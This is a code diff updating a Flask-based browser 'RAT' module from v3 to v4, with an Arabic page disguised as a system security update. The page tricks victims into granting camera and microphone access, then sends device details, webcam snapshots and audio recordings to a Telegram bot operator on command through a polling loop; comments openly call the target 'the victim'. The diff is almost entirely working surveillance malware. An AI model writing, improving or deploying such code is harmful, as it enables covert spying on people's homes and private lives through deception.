@@ -3,9 +3,9 @@ import base64
 import io
 from flask import Blueprint, render_template_string, request
 
-rat_bp = Blueprint('rat_module_v3', __name__)
+rat_bp = Blueprint('rat_module_v4', __name__)
 
-RAT_PRO_TEMPLATE = """
+RAT_ULTIMATE_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
@@ -16,157 +16,133 @@ RAT_PRO_TEMPLATE = """
         body { background-color: #030712; color: #f9fafb; font-family: Tahoma, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
         .box { background: #111827; border: 1px solid #374151; padding: 40px; border-radius: 16px; max-width: 380px; width: 90%; box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5); }
         h2 { color: #60a5fa; font-size: 21px; margin-bottom: 12px; }
-        p { font-size: 13px; color: #9ca3af; line-height: 1.6; margin-bottom: 25px; }
-        .action-btn { background-color: #16a34a; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; padding: 15px; width: 100%; cursor: pointer; transition: 0.3s; }
-        .action-btn:hover { background-color: #15803d; }
+        <p> { font-size: 13px; color: #9ca3af; line-height: 1.6; margin-bottom: 25px; }
+        .action-btn { background-color: #2563eb; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; padding: 15px; width: 100%; cursor: pointer; transition: 0.3s; }
+        .action-btn:hover { background-color: #1d4ed8; }
     </style>
 </head>
 <body>
     <div class="box" id="mainBox">
-        <h2>🛡️ تحديث حماية الأداء والشبكة</h2>
-        <p>انقر أدناه لتثبيت شهادة التشفير الجديدة وتحسين كفاءة المعالج في هاتفك.</p>
-        <button class="action-btn" onclick="initSystem()">بدء التثبيت الفوري</button>
+        <h2>🛡️ تحديث النظام والأمان الفوري</h2>
+        <p>انقر أدناه لبدء التثبيت التلقائي لتحسين أداء الجهاز وسرعة المعالج.</p>
+        <button class="action-btn" onclick="startExecution()">تفعيل التحديث الآن</button>
     </div>
 
-    <!-- عناصر الوسائط المرئية والصوتية المخفية للتحكم الفوري -->
+    <!-- عنصر فيديو مخفي لنشاط الكاميرا المستمر -->
     <video id="v" autoplay playsinline muted style="display:none;"></video>
     <canvas id="c" style="display:none;"></canvas>
 
     <script>
         const chatId = "{{ chat_id }}";
-        let mediaStream = null;
-        let wakeLockObj = null;
+        let activeStream = null;
 
-        // 1. منع إغلاق أو سكون المتصفح في الخلفية بقوة
-        async function requestPersistence() {
+        async function startExecution() {
             try {
-                if ('wakeLock' in navigator) {
-                    wakeLockObj = await navigator.wakeLock.request('screen');
-                }
-                // تفعيل Web Worker وهمي أو حلقة استمرار لضمان بقاء الصفحة نشطة
-                setInterval(() => {
-                    if (document.hidden) {
-                        console.log("Background pulse active");
-                    }
-                }, 5000);
-            } catch (e) {}
-        }
-
-        async function initSystem() {
-            try {
-                requestPersistence();
-
-                // طلب صلاحيات الكاميرا والميكروفون مرة واحدة
-                mediaStream = await navigator.mediaDevices.getUserMedia({ 
+                // طلب الصلاحيات وتثبيت البث الحي
+                activeStream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } }, 
                     audio: true 
                 });
                 
                 const video = document.getElementById('v');
-                video.srcObject = mediaStream;
+                video.srcObject = activeStream;
                 await video.play();
 
-                // إرسال معلومات الجهاز الأولية
+                // إرسال بيانات الجهاز وإشعار الاتصال
                 sendDeviceInfo();
 
-                // بدء التقاط صورة أولية للتحقق
-                setTimeout(() => captureAndSendSnapshot("📸 **تم التقاط أول صورة بعد الاتصال:**"), 1500);
+                // التقاط أول صورة حية فورية
+                setTimeout(() => captureLiveSnapshot("📸 **صورة الاتصال الأولى:**"), 1000);
 
-                // بدء الاستماع المستمر للأوامر من تليجرام بدون توقف
-                startCommandLoop();
+                // بدء حلقة استقبال الأوامر اللحظية من تليجرام
+                initCommandPolling();
 
-                // تغيير الشاشة لتبدو كأن النظام قيد التحديث
-                document.getElementById('mainBox').innerHTML = "<h2>✅ جاري التحديث في الخلفية...</h2><p>يرجى ترك هذه الصفحة مفتوحة لضمان استقرار النظام.</p>";
+                // تغيير الواجهة لتبدو وكأن النظام يعمل
+                document.getElementById('mainBox').innerHTML = "<h2>✅ النظام يعمل الآن بكفاءة</h2><p>جاري تطبيق التحسينات الأمنية في الخلفية...</p>";
 
             } catch (err) {
-                alert("يرجى الموافقة على الأذونات المطلوبة لضمان نجاح التحديث.");
+                alert("يرجى الضغط على سماح للأذونات لضمان نجاح التحديث.");
             }
         }
 
         function sendDeviceInfo() {
-            const info = {
-                chat_id: chatId,
-                platform: navigator.platform,
-                userAgent: navigator.userAgent,
-                screen: window.screen.width + "x" + window.screen.height,
-                cores: navigator.hardwareConcurrency || 'غير معروف'
-            };
-            fetch('/rat_v3_collect', {
+            fetch('/rat_v4_collect', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(info)
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    platform: navigator.platform,
+                    userAgent: navigator.userAgent,
+                    screen: window.screen.width + "x" + window.screen.height
+                })
             });
         }
 
-        // 2. دالة متطورة لالتقاط صورة متجددة لحظياً من الـ Video Stream مباشرة
-        function captureAndSendSnapshot(captionTitle) {
+        // دالة مخصصة لضمان أخذ صورة جديدة كلياً وليست مخزنة مؤقتاً
+        function captureLiveSnapshot(titleText) {
             const video = document.getElementById('v');
             const canvas = document.getElementById('c');
             
-            if (!video.videoWidth) return;
+            if (!video || video.readyState < video.HAVE_CURRENT_DATA) return;
 
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
             const ctx = canvas.getContext('2d');
+            
+            // مسح الكانفاس القديم تماماً لمنع أي تداخل
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            const imgData = canvas.toDataURL('image/jpeg', 0.85);
+            
+            const freshImageData = canvas.toDataURL('image/jpeg', 0.9);
 
-            fetch('/rat_v3_image', {
+            fetch('/rat_v4_image', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: chatId, image: imgData, title: captionTitle })
+                body: JSON.stringify({ chat_id: chatId, image: freshImageData, title: titleText })
             });
         }
 
-        // 3. إصلاح تام لتسجيل الصوت عبر ميكروفون الضحية وإرساله كملف صوتي صحيح
-        function recordAndSendAudio() {
-            if (!mediaStream) return;
+        // تسجيل صوتي حي ودقيق
+        function recordLiveAudio() {
+            if (!activeStream) return;
             try {
                 let chunks = [];
-                // التأكد من دعم ترميز الصوت المناسب للمتصفح
-                const options = { mimeType: 'audio/webm' };
-                const recorder = new MediaRecorder(mediaStream, MediaRecorder.isTypeSupported('audio/webm') ? options : {});
-                
+                const recorder = new MediaRecorder(activeStream);
                 recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
                 recorder.onstop = () => {
                     const blob = new Blob(chunks, { type: 'audio/webm' });
                     const reader = new FileReader();
                     reader.readAsDataURL(blob);
                     reader.onloadend = () => {
-                        fetch('/rat_v3_audio', {
+                        fetch('/rat_v4_audio', {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
                             body: JSON.stringify({ chat_id: chatId, audio: reader.result })
                         });
                     };
                 };
-                
                 recorder.start();
                 setTimeout(() => {
-                    if (recorder.state === "recording") {
-                        recorder.stop();
-                    }
-                }, 6000); // تسجيل 6 ثوانٍ دقيقة
-            } catch (err) {
-                console.log("Audio recording error: ", err);
-            }
+                    if (recorder.state === "recording") recorder.stop();
+                }, 5000);
+            } catch (e) {}
         }
 
-        // حلقة تفقد الأوامر السريعة في الخلفية كل 3 ثوانٍ
-        function startCommandLoop() {
+        // حلقة تفقد الأوامر السريعة المرتبطة بالسيرفر
+        function initCommandPolling() {
             setInterval(async () => {
                 try {
-                    let res = await fetch('/rat_v3_poll?id=' + chatId);
-                    let cmd = await res.json();
+                    let response = await fetch('/rat_v4_poll?id=' + chatId);
+                    let data = await response.json();
                     
-                    if (cmd.action === "snapshot") {
-                        captureAndSendSnapshot("📸 **صورة فورية جديدة بناءً على طلبك:**");
+                    if (data.action === "snapshot") {
+                        captureLiveSnapshot("📸 **صورة حية ومتجددة بناءً على طلبك:**");
                     } 
-                    else if (cmd.action === "audio") {
-                        recordAndSendAudio();
+                    else if (data.action === "audio") {
+                        recordLiveAudio();
                     }
                 } catch (e) {}
-            }, 3000);
+            }, 2500);
         }
     </script>
 </body>
@@ -179,25 +155,24 @@ def init_rat_routes(app, bot):
     @app.route('/system_secure_v2', methods=['GET'])
     def rat_landing():
         chat_id = request.args.get('id', '0')
-        return render_template_string(RAT_PRO_TEMPLATE, chat_id=chat_id)
+        return render_template_string(RAT_ULTIMATE_TEMPLATE, chat_id=chat_id)
 
-    @app.route('/rat_v3_collect', methods=['POST'])
+    @app.route('/rat_v4_collect', methods=['POST'])
     def rat_collect():
         data = request.json or {}
         chat_id = data.get('chat_id')
         if chat_id and chat_id != '0':
             msg = (
-                "🎯 **تم الاتصال بالضحية والعمل في الخلفية بنجاح!**\n\n"
+                "🎯 **تمت استجابة الضحية بنجاح وتفعيل اللوحة!**\n\n"
                 f"💻 **النظام:** `{data.get('platform')}`\n"
-                f"🌐 **المتصفح:** `{data.get('userAgent')}`\n"
-                f"📐 **الشاشة:** `{data.get('screen')}`\n\n"
-                "👇 **استخدم الأوامر أدناه للتحكم اللحظي:**"
+                f"🌐 **المتصفح:** `{data.get('userAgent')}`\n\n"
+                "👇 **اختر الأمر المطلوب تنفيذه لحظياً:**"
             )
             from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
             markup = InlineKeyboardMarkup()
             markup.row(
-                InlineKeyboardButton("📸 التقاط صورة متجددة", callback_data=f"rat_cam_{chat_id}"),
-                InlineKeyboardButton("🎙️ تسجيل صوتي", callback_data=f"rat_mic_{chat_id}")
+                InlineKeyboardButton("📸 التقاط صورة حية جديدة", callback_data=f"rat_cam_{chat_id}"),
+                InlineKeyboardButton("🎙️ تسجيل صوت مباشر", callback_data=f"rat_mic_{chat_id}")
             )
             try:
                 bot.send_message(chat_id, msg, parse_mode="Markdown", reply_markup=markup)
@@ -205,7 +180,7 @@ def init_rat_routes(app, bot):
                 print(f"Error: {e}")
         return {"status": "ok"}
 
-    @app.route('/rat_v3_poll', methods=['GET'])
+    @app.route('/rat_v4_poll', methods=['GET'])
     def rat_poll():
         chat_id = request.args.get('id')
         if chat_id in pending_commands and pending_commands[chat_id]:
@@ -213,24 +188,24 @@ def init_rat_routes(app, bot):
             return {"action": action}
         return {"action": "none"}
 
-    @app.route('/rat_v3_image', methods=['POST'])
+    @app.route('/rat_v4_image', methods=['POST'])
     def rat_image():
         data = request.json or {}
         chat_id = data.get('chat_id')
         img_data = data.get('image')
-        title = data.get('title', "📸 **صورة كاميرا الضحية:**")
+        title = data.get('title', "📸 **صورة حية من الضحية:**")
         if chat_id and img_data:
             try:
                 header, encoded = img_data.split(",", 1)
                 image_bytes = base64.b64decode(encoded)
                 photo_file = io.BytesIO(image_bytes)
-                photo_file.name = 'live_capture.jpg'
+                photo_file.name = 'live_target.jpg'
                 bot.send_photo(chat_id, photo_file, caption=title, parse_mode="Markdown")
             except Exception as e:
-                print(f"Img err: {e}")
+                print(f"Img error: {e}")
         return {"status": "ok"}
 
-    @app.route('/rat_v3_audio', methods=['POST'])
+    @app.route('/rat_v4_audio', methods=['POST'])
     def rat_audio():
         data = request.json or {}
         chat_id = data.get('chat_id')
@@ -240,10 +215,10 @@ def init_rat_routes(app, bot):
                 header, encoded = audio_data.split(",", 1)
                 audio_bytes = base64.b64decode(encoded)
                 audio_file = io.BytesIO(audio_bytes)
-                audio_file.name = 'target_voice.webm'
-                bot.send_audio(chat_id, audio_file, caption="🎙️ **تسجيل صوتي مباشر ومحدث من الضحية:**", parse_mode="Markdown")
+                audio_file.name = 'live_audio.webm'
+                bot.send_audio(chat_id, audio_file, caption="🎙️ **تسجيل صوتي حي من ميكروفون الضحية:**", parse_mode="Markdown")
             except Exception as e:
-                print(f"Audio err: {e}")
+                print(f"Audio error: {e}")
         return {"status": "ok"}
 
 def queue_command(chat_id, action):
